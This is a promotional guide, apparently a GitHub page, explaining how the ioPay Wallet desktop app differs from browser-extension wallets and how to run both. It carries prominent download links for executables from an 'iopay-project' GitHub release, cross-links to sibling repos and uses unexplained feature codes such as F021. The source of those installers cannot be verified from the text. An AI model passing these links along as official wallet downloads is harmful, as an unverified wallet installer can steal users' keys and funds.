![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# ioPay Wallet and Browser Extensions: Which to Use, and How to Run Both

**ioPay Wallet is a desktop application for Windows, macOS and Linux - not a browser extension.** There is no extension build, and this page will not suggest otherwise.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

That answer resolves the first question and leaves the more useful one: if you already use a browser extension for web3, is a desktop wallet an alternative or a companion? Mostly a companion, and the split is easier to see once you look at what each one is good at.

## What an extension is good at

- **Living in the tab.** A dApp asks for a connection, the extension pops up, you sign, you are done. No window switching.
- **One install, many sites.** The same wallet serves every dApp you visit.
- **Low friction for small actions.** Approvals, mints, quick swaps.

The cost is the setting: a browser profile is a busy place, the wallet's approval dialog arrives while you are reading something else, and the phishing surface is the page you are on.

## What a desktop app is good at

- **Depth on one screen.** Staking with validators compared on APY, uptime and commission; buckets and stake-lock; the unstaking countdown (F021).
- **Bridging with a status tracker** rather than a progress bar in a tab (F023).
- **DePIN income** - device lists, ioID registration, burn-drop allocations per staking bucket, earnings calculator (F025).
- **Keys outside the browser.** Secrets stored in the operating system's keychain, behind a PIN and biometric lock (F029).
- **Hardware signing over USB**, offline signing and watch-only mode (F028).
- **A record you can read.** History, fees, block numbers, portfolio and tax export - the things you want when you are reviewing rather than clicking.

The cost is the opposite of the extension's: it is not in the tab, so dApp sessions are not its job.

## The split that works

**Extension for sessions, desktop for positions.** Use the browser wallet for dApp connections and quick approvals; use the desktop app when you are staking, bridging, reviewing DePIN income, or exporting records. Your positions are on-chain, so both see the same account - the split is about interface, not custody.

**Same account in both.** Import the same phrase (or private key, or keystore) into both, and both show the same `io1...` and `0x...` addresses for that account (F018, F019). Nothing is duplicated, and nothing needs to be "moved" between them.

**WalletConnect as the bridge.** This build's codebase includes WalletConnect support alongside Ledger and Trezor providers (F011), which is how a desktop app and browser-based dApps can talk without an extension.

## What running both actually costs

**Two things to keep updated.** An extension that is months behind and a desktop app that is current is a bad pair; keep both on their current releases.

**Two places a phrase could be typed.** The phrase belongs in the import screen of each app and nowhere else - not in a dApp, not in a "connect" flow, not in a support chat. Running two apps doubles the number of windows in which someone could ask you for it.

**One backup, not two.** The phrase is the backup for the account, whichever app you restored it into. Do not treat "it is in two apps" as redundancy. [Backup guide](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-back-up-an-iopay-seed-phrase.md).

**A decision about which is primary.** Pick one as the app you stake from and export from, so your records have a home. The other is a signing surface.

## "Which is better for IoTeX?"

For IoTeX work, the desktop app does more, because staking, bridging, DePIN income and the dual-address display are built for the chain rather than bolted on (F021, F023, F025, F019). For being *present* in a dApp while you use it, an extension is better, because that is what it is for.

So the answer is not one or the other. It is: use the extension where the tab is, and the desktop app where the position is. If you want the wider comparison against other desktop wallets, [that page refuses to rank them](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/how-iopay-wallet-compares-to-other-desktop-wallets.md); if you are deciding whether to change anything at all, [start here](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/is-iopay-a-good-desktop-wallet-alternative.md).

## Before you add a second surface

- **Back up and test the phrase first.** A second app on the same account is a second chance to need it.
- **Install only from the project's release channel.** [Windows guide](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/install-iopay-wallet-on-windows.md) and its macOS and Linux siblings.
- **Know which address format a dApp expects.** Extensions usually deal in the `0x...` form; this wallet shows both, and the difference matters when you paste. [Addresses explained](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/io1-and-0x-addresses-in-iopay.md).
- **Do not disable browser protections to make a connection work.** If a dApp needs that, the problem is the dApp.

## FAQ

**Is ioPay a browser extension or a desktop app?**
A desktop app, for Windows, macOS and Linux. There is no extension build.

**Which wallet is better for IoTeX, ioPay or a browser extension?**
The desktop app for staking, bridging, DePIN income and record-keeping; an extension for dApp sessions in the tab. Most people use both.

**Can I use the same account in both?**
Yes - import the same phrase, key or keystore, and both see the same account and both addresses.

**Does the desktop app show tokens and NFTs?**
It shows XRC-20 balances per account; [the token page](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-nft-and-token-support.md) covers what it displays and what it does not claim.

**Does running both double my risk?**
It doubles the number of apps you must keep updated and the number of places a phrase could be requested. The phrase stays out of both except at import, and both stay current.

**Is a desktop wallet safer than an extension?**
Different, not simply safer. A desktop app keeps keys outside the browser profile and supports USB hardware signing; an extension keeps the wallet in the same place you browse. The threats differ, and neither is immune to a phrase leak.

---

*Platform coverage, keychain storage, hardware support and WalletConnect presence are from the v2.0.2 build and repository. No endorsement is claimed (F041).*
